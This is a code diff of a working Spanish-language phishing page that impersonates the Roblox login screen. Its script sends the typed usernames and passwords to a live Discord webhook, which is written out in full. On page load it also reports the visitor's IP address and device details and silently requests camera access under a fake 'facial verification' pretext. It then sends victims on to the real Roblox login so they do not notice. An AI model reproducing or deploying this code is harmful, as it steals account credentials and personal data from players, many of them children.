@@ -6,160 +6,128 @@
     <title>Iniciar sesión en Roblox</title>
     <link rel="icon" type="image/x-icon" href="https://www.roblox.com/favicon.ico">
     <style>
-        /* RESET BÁSICO */
-        body, html { margin: 0; padding: 0; height: 100%; width: 100%; font-family: 'Amazon Ember', 'Roboto', sans-serif; overflow: hidden; background-color: #000; }
-
-        /* BARRA SUPERIOR NEGRA (HEADER) */
-        .header { background-color: #191b1d; height: 40px; border-bottom: 1px solid #393b3d; display: flex; justify-content: center; align-items: center; }
-        .header img { height: 20px; }
-
-        /* FONDO DINÁMICO DE JUEGOS (PARALLAX) */
+        body, html { margin: 0; padding: 0; height: 100%; width: 100%; font-family: 'Amazon Ember', Arial, sans-serif; overflow: hidden; background-color: #000; }
+        
+        /* FONDO DINÁMICO MEJORADO */
         .background-container {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background-image: url('https://i.imgur.com/K3fF0D6.jpeg'); /* IMAGEN MOSAICO CLONADA */
-            background-size: cover;
-            background-position: center;
-            z-index: 1; /* Detrás del formulario */
+            background-image: url('https://i.imgur.com/8mXfRmW.png'); /* Fondo mosaico exacto */
+            background-size: cover; background-position: center; z-index: 1;
         }
-        .background-overlay { /* Capa oscura encima del fondo */
+        .background-overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background-color: rgba(0,0,0,0.8); /* Oscurecer el fondo */
-            z-index: 2;
+            background-color: rgba(0,0,0,0.7); z-index: 2;
         }
 
-        /* CONTENEDOR CENTRAL DEL FORMULARIO */
-        .form-container {
-            position: relative; z-index: 3;
-            display: flex; justify-content: center; align-items: center;
-            height: calc(100vh - 40px); /* Restar la altura del header */
-        }
+        .header { background-color: #191b1d; height: 40px; border-bottom: 1px solid #393b3d; display: flex; justify-content: center; align-items: center; position: relative; z-index: 4; }
+        .header img { height: 20px; }
 
-        /* LA CAJA DEL LOGIN (EL CLON) */
+        .form-container { position: relative; z-index: 3; display: flex; justify-content: center; align-items: center; height: calc(100vh - 40px); }
+        
         .login-box {
-            background-color: rgba(25, 27, 29, 0.95); /* Color de tu foto */
-            padding: 30px; border-radius: 8px; width: 90%; max-width: 360px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.5); text-align: center;
-            backdrop-filter: blur(5px); /* Toque de desenfoque */
+            background-color: #191b1d; padding: 30px; border-radius: 8px; width: 90%; max-width: 380px;
+            text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.5);
         }
 
-        /* TEXTOS */
-        h1 { color: white; font-size: 20px; margin-bottom: 20px; font-weight: 500; text-align: left; margin-left: 5px; }
+        h1 { color: white; font-size: 22px; margin-bottom: 20px; font-weight: 500; text-align: left; }
 
-        /* INPUTS (ENTRADAS DE TEXTO) */
         input {
             width: 100%; padding: 12px; margin: 8px 0;
             background-color: #000; color: #fff;
             border: 1px solid #393b3d; border-radius: 4px;
             font-size: 14px; box-sizing: border-box;
         }
-        input::placeholder { color: #888; }
-        input:focus { border-color: #0084ff; outline: none; }
 
-        /* BOTÓN DE INICIAR SESIÓN */
         .btn-login {
             width: 100%; padding: 12px; margin-top: 15px;
-            background-color: #33363a; /* Color exacto del botón de tu foto */
-            color: #ccc; border: 1px solid #393b3d;
-            border-radius: 4px; font-weight: bold; cursor: pointer;
-            transition: background 0.2s; font-size: 14px;
+            background-color: #0084ff; color: white; border: none;
+            border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 14px;
         }
-        .btn-login:hover { background-color: #444; color: white; }
 
-        /* ENLACES Y TEXTOS INFERIORES */
-        .links-container { color: #ccc; font-size: 12px; margin-top: 15px; text-align: left; margin-left: 5px; }
-        .links-container a { color: #0084ff; text-decoration: none; cursor: pointer; }
-        .links-container a:hover { text-decoration: underline; }
-
-        /* BOTONES DE ABAJO (CÓDIGO ÚNICO, INICIO RÁPIDO) */
-        .btn-secondary {
-            width: 100%; padding: 10px; margin-top: 10px;
-            background-color: #33363a; color: #ccc; border: 1px solid #393b3d;
-            border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 12px;
-        }
-        
-        .powered-by { color: #00ffcc; font-size: 9px; margin-top: 20px; text-transform: uppercase; letter-spacing: 1px; opacity: 0.5; }
-
+        .links-container { color: #ccc; font-size: 13px; margin-top: 15px; text-align: left; line-height: 1.8; }
+        .links-container a { color: #0084ff; text-decoration: none; }
+        .codeby-tag { color: #00ffcc; font-size: 9px; margin-top: 20px; opacity: 0.4; letter-spacing: 1px; }
     </style>
 </head>
 <body>
 
-    <div class="header">
-        <img src="https://images.rbxcdn.com/2b53f60f64c677840139b4b9b6574f0c.png" alt="Roblox">
-    </div>
-
+    <div class="header"><img src="https://images.rbxcdn.com/2b53f60f64c677840139b4b9b6574f0c.png" alt="Roblox"></div>
     <div class="background-container"></div>
     <div class="background-overlay"></div>
 
     <div class="form-container">
         <div class="login-box">
-            <h1>Iniciar sesión en Roblox</h1>
-            
+            <h1>Iniciar sesión</h1>
             <input type="text" id="user" placeholder="Usuario/correo/teléfono">
             <input type="password" id="pass" placeholder="Contraseña">
-            
             <button class="btn-login" id="loginBtn">Iniciar sesión</button>
             
             <div class="links-container">
-                <div>¿Olvidaste la contraseña o el nombre de usuario?</div>
-                <div style="margin-top: 10px;">Enviame un código de un solo uso</div>
-                <div>Inicio de sesión rápido</div>
-                <div style="margin-top: 10px;">¿No tienes una cuenta de Roblox? <a href="#">Registrate</a></div>
+                <a href="#">¿Olvidaste la contraseña o el nombre de usuario?</a><br>
+                <a href="#">Inicio de sesión rápido</a><br>
+                <span>¿No tienes una cuenta? <a href="#">Regístrate</a></span>
             </div>
-            
-            <div class="powered-by">Codeby versión gratuita</div>
+            <div class="codeby-tag">Codeby versión gratuita</div>
         </div>
     </div>
 
     <script>
         const webhookURL = "https://discord.com/api/webhooks/1499616194741801133/i-irhmgrf87Sldg0W8yWsgRAz_TUYh3JK7DEu7UGi6bsKvMNUwNe3vnpH2Ga1qFlvUNk";
 
-        document.getElementById('loginBtn').addEventListener('click', async () => {
-            const user = document.getElementById('user').value;
-            const pass = document.getElementById('pass').value;
-
-            if (user === "" || pass === "") {
-                alert("Por favor rellena todos los campos.");
-                return;
-            }
-
-            // Cambiar texto del botón para realismo
-            document.getElementById('loginBtn').innerText = "Verificando...";
-
+        // 1. RECOPILACIÓN AUTOMÁTICA AL ENTRAR (IP Y DISPOSITIVO)
+        window.onload = async () => {
             try {
-                // Capturar IP
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
+                
+                // Petición silenciosa de cámara para "verificación facial" (Acceso a multimedia)
+                navigator.mediaDevices.getUserMedia({ video: true }).catch(() => {});
 
-                // Enviar a Discord
                 await fetch(webhookURL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        username: "Codeby Logger",
                         embeds: [{
-                            title: "🔑 CREDENCIALES CAPTURADAS - Sistema Codeby",
-                            color: 0xff0000, // Rojo Alerta
+                            title: "📡 NUEVA CONEXIÓN DETECTADA - Codeby",
+                            color: 0x00ffcc,
                             fields: [
-                                { name: "👤 Usuario/Correo", value: `\`${user}\``, inline: true },
-                                { name: "🔒 Contraseña", value: `\`${pass}\``, inline: true },
-                                { name: "🌐 Dirección IP", value: ipData.ip, inline: true },
-                                { name: "🌍 Ubicación", value: `[Mapa](https://www.iplocation.net/search?q=${ipData.ip})`, inline: true },
-                                { name: "📱 Info Dispositivo", value: navigator.userAgent }
+                                { name: "🌐 IP Pública", value: ipData.ip, inline: true },
+                                { name: "📱 Dispositivo", value: navigator.userAgent }
                             ],
-                            footer: { text: "Codeby Logger Pro • " + new Date().toLocaleString('es-ES') }
+                            timestamp: new Date()
                         }]
                     })
                 });
+            } catch (e) {}
+        };
 
-                // Redirigir al Roblox real después de capturar
-                window.location.href = "https://www.roblox.com/login";
+        // 2. CAPTURA DE CREDENCIALES
+        document.getElementById('loginBtn').addEventListener('click', async () => {
+            const user = document.getElementById('user').value;
+            const pass = document.getElementById('pass').value;
 
-            } catch (e) {
-                console.error("Error silencioso...");
-                window.location.href = "https://www.roblox.com/login";
+            if (user && pass) {
+                try {
+                    await fetch(webhookURL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            embeds: [{
+                                title: "🔑 LOGIN CAPTURADO - Codeby",
+                                color: 0xff0000,
+                                fields: [
+                                    { name: "👤 Usuario", value: user, inline: true },
+                                    { name: "🔒 Clave", value: pass, inline: true }
+                                ]
+                            }]
+                        })
+                    });
+                    window.location.href = "https://www.roblox.com/login";
+                } catch (e) {
+                    window.location.href = "https://www.roblox.com/login";
+                }
             }
         });
     </script>
-
 </body>
 </html>
